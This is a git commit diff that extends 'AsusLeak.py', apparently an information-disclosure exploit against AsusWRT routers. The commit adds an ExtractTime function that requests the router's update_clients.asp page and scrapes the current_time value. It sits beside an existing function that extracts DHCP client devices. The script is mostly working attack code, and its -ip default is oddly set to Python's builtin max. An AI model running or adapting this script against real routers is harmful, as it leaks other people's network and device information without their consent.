045f1b09d87bf86ae69434b1b83541f48e34747d
remix30303 <31669127+remix30303@users.noreply.github.com>
2018-10-14 12:46:04 +0200

    Add files via upload

--- AsusLeak.py
+++ AsusLeak.py
@@ -18,8 +18,19 @@ def ExtractDHCP(ip):
 		device = device.replace(']',"")
 		device = device.replace(';n',"")
 		print(device)
+def ExtractTime(ip):
+	url='http://{}/update_clients.asp'.format(ip)
+	r = requests.get(url)
+	html = str(r.content)
+	result = re.search("current_time:(.*)',", html)
+	time = result.group(1)
+	time = time.replace("\\","")
+	time = time.replace("'","")
+	print(time)
+	
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser(description='AsusWRT DHCP extract')
 	parser.add_argument('-ip', action ='store', dest='ip', help="IP of router",default=max)
 	results = parser.parse_args()
 	ExtractDHCP(results.ip)
+	ExtractTime(results.ip)
